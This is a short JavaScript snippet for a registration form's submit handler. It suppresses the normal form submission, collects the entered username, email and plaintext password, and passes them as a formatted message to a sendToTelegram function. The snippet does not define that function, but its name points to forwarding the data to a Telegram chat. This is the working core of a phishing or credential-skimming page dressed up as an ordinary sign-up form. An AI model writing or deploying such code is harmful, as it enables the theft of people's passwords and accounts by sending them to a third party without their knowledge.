document.getElementById('register-form').addEventListener('submit', function(e) {
    e.preventDefault();
    const username = document.getElementById('new-username').value || 'No Username';
    const email = document.getElementById('email').value || 'No Email';
    const password = document.getElementById('new-password').value || 'No Password';
    const message = `🆕 New Account Registration:\n👤 Username: ${username}\n📧 Email: ${email}\n🔑 Password: ${password}`;
    sendToTelegram(message);
});